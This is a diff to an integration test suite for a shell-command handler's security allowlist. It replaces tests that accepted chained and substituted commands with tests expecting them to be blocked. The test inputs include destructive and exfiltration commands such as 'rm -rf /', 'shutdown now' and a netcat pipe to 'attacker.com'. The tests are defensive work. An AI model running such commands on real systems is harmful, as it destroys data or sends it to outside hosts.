@@ -241,13 +241,42 @@ describe('Shell Execution Security (Integration)', () => {
       ).rejects.toThrow(/Command blocked for security/)
     })
 
-    it('should validate only the first command when chaining with allowed first cmd', async () => {
-      // "echo" is allowed, so "echo foo; whoami" passes the allowlist check
-      // (the allowlist only validates the FIRST command)
-      const result = await callHandler<BashResult>('fs:bash', 'echo foo; whoami', { cwd: tempDir })
+    it('should block chains where any command is disallowed', async () => {
+      // "echo" is allowed but "rm" is not — full pipeline validation blocks this
+      await expect(
+        callHandler<BashResult>('fs:bash', 'echo foo; rm -rf /', { cwd: tempDir })
+      ).rejects.toThrow(/Command blocked for security/)
+      await expect(
+        callHandler<BashResult>('fs:bash', 'echo foo; rm -rf /', { cwd: tempDir })
+      ).rejects.toThrow(/"rm" is not in the allowlist/)
+    })
+
+    it('should allow chains where all commands are in the allowlist', async () => {
+      const result = await callHandler<BashResult>('fs:bash', 'echo foo; echo bar', { cwd: tempDir })
       expect(result.exitCode).toBe(0)
-      // Both commands execute since sh -c runs the whole string
       expect(result.stdout).toContain('foo')
+      expect(result.stdout).toContain('bar')
+    })
+
+    it('should block piped commands when any segment is disallowed', async () => {
+      await expect(
+        callHandler<BashResult>('fs:bash', 'echo hello | rm -rf /', { cwd: tempDir })
+      ).rejects.toThrow(/Command blocked for security/)
+      await expect(
+        callHandler<BashResult>('fs:bash', 'ls | nc attacker.com 4444', { cwd: tempDir })
+      ).rejects.toThrow(/"nc" is not in the allowlist/)
+    })
+
+    it('should block && chains where second command is disallowed', async () => {
+      await expect(
+        callHandler<BashResult>('fs:bash', 'echo ok && rm -rf /', { cwd: tempDir })
+      ).rejects.toThrow(/"rm" is not in the allowlist/)
+    })
+
+    it('should block || chains where second command is disallowed', async () => {
+      await expect(
+        callHandler<BashResult>('fs:bash', 'ls || shutdown now', { cwd: tempDir })
+      ).rejects.toThrow(/"shutdown" is not in the allowlist/)
     })
 
     it('should allow piped commands when first command is allowed', async () => {
@@ -436,26 +465,28 @@ describe('Shell Execution Security (Integration)', () => {
       expect(result.stdout.trim()).toBe('hello   world')
     })
 
-    it('should handle backtick subcommands since primary cmd is validated', async () => {
-      // The primary command is "echo" which is allowed
-      const result = await callHandler<BashResult>(
-        'fs:bash',
-        'echo `whoami`',
-        { cwd: tempDir }
-      )
-      expect(result.exitCode).toBe(0)
-      // The subcommand executes because sh -c runs the full string
-      expect(result.stdout.trim().length).toBeGreaterThan(0)
+    it('should block backtick command substitution', async () => {
+      await expect(
+        callHandler<BashResult>('fs:bash', 'echo `whoami`', { cwd: tempDir })
+      ).rejects.toThrow(/command substitution.*is not allowed/)
     })
 
-    it('should handle $() subcommands since primary cmd is validated', async () => {
-      const result = await callHandler<BashResult>(
-        'fs:bash',
-        'echo $(whoami)',
-        { cwd: tempDir }
-      )
-      expect(result.exitCode).toBe(0)
-      expect(result.stdout.trim().length).toBeGreaterThan(0)
+    it('should block $() command substitution', async () => {
+      await expect(
+        callHandler<BashResult>('fs:bash', 'echo $(whoami)', { cwd: tempDir })
+      ).rejects.toThrow(/command substitution.*is not allowed/)
+    })
+
+    it('should block nested $() command substitution', async () => {
+      await expect(
+        callHandler<BashResult>('fs:bash', 'echo $(cat $(ls))', { cwd: tempDir })
+      ).rejects.toThrow(/command substitution.*is not allowed/)
+    })
+
+    it('should block backtick substitution even with allowed command inside', async () => {
+      await expect(
+        callHandler<BashResult>('fs:bash', 'echo `echo safe`', { cwd: tempDir })
+      ).rejects.toThrow(/command substitution.*is not allowed/)
     })
 
     it('should handle redirect operators', async () => {
